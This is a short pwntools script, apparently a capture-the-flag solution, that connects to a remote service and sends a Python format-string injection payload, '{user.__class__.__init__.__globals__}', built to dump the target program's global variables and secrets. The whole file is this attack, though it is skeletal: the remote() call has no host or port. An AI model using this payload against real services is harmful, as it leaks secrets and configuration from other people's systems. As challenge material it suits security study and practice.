from pwn import *

context.log_level = "debug"

io = remote()

io.recv()
io.sendline(b"")
io.recv()
io.sendline(b"")
io.recv()
io.sendline(b"{user.__class__.__init__.__globals__}")
io.recv()
